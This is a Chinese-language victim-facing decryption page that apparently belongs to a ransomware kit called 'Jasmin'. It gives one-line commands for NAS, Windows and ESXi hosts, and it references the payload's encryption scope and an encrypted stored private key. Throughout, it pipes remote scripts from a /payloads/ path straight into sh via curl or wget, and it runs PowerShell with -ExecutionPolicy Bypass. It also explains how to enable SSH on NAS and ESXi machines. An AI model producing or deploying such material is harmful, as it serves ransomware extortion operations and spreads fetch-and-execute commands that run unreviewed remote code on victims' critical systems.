解密教程

🗄️ NAS 一键解密（QNAP / Synology）

# 先 SSH 登录 NAS（QNAP: 控制台>网络和文件服务>启用SSH / Synology: 控制面板>终端机和SNMP>启用SSH）
# 不写目录则解密全部加密文件（数据卷 + 所有真实挂载点）—— 与加密范围完全对齐
curl -sL /payloads/jasmin_unlock.sh | sh -s  ""

# 只需解特定数据卷时，在末尾追加（可多个，逗号或空格分隔）
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /volume1
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /share/CACHEDEV1_DATA /share/CACHEDEV2_DATA

# 若 NAS 上 curl 不可用，改用 wget（QNAP/Synology 默认都带 wget）
wget -qO- /payloads/jasmin_unlock.sh | sh -s  ""
私钥已AES-128-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理

🖥️ Windows 一键解密

:: 纯 PowerShell 实现，无需编译 exe
:: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
curl.exe -sL /payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server  -K ""
:: 不写 -Paths 则解密全部加密文件（所有磁盘 + 常用用户目录）
:: 也可只解指定目录：-Paths C:\data D:\work

🖥️ VMware ESXi 一键解密

# 先启用 SSH（ESXi 6.x: Host > 管理 > 服务 > TSM-SSH；
#            ESXi 7/8: Host > 操作 > 服务 > 启用安全 Shell）
# ESXi 是 BusyBox/POSIX 环境，复用与 Linux 相同的零依赖脚本；
# 依赖 openssl 与 od（ESXi 7.0+ 自带），缺哪个脚本会明确报出对应名字。
# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点，
# 即 /vmfs/volumes 下的各个数据存储）—— 与载荷加密范围完全对齐
curl -sL /payloads/jasmin_unlock.sh | sh -s  ""

# 只需解特定数据存储时，在末尾追加（可多个）
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /vmfs/volumes/datastore1

# ESXi 上 curl 不可用时改用 wget
wget -qO- /payloads/jasmin_unlock.sh | sh -s  ""
